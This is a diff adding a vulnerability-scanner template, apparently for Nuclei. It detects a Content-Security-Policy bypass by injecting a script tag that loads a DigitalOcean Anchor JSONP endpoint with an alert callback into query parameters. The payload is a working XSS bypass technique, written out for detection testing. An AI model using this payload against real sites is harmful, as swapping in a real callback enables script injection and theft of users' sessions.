@@ -1,0 +1,55 @@
+id: digitalocean-anchor-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - DigitalOcean Anchor
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,digitalocean-anchor,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "digitalocean.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: digitalocean_anchor_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://anchor.digitalocean.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "digitalocean_anchor_csp_xss == true"
+# digest: 4b0a0048304602210095767d0651a872d3f7e3d9a1d9acf1caa524a8b3c1c32296fb286c9d6b648b06022100a73e1d25b5d8bfd461ecb2a4d56263919402b7adbf53d74b74d383aba9b4f82e:922c64590222798bb761d5b6d8e72950
